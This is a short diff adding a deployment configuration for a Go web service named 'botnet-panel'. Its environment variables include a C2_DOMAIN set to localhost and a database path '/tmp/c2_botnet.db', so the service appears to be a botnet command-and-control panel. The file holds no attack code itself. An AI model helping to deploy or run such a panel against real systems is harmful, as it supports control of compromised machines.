@@ -1,0 +1,13 @@
+services:
+  - type: web
+    name: botnet-panel
+    runtime: go
+    buildCommand: go build -o server .
+    startCommand: ./server
+    envVars:
+      - key: C2_DOMAIN
+        value: "localhost"
+      - key: GIN_MODE
+        value: "release"
+      - key: DB_PATH
+        value: "/tmp/c2_botnet.db"
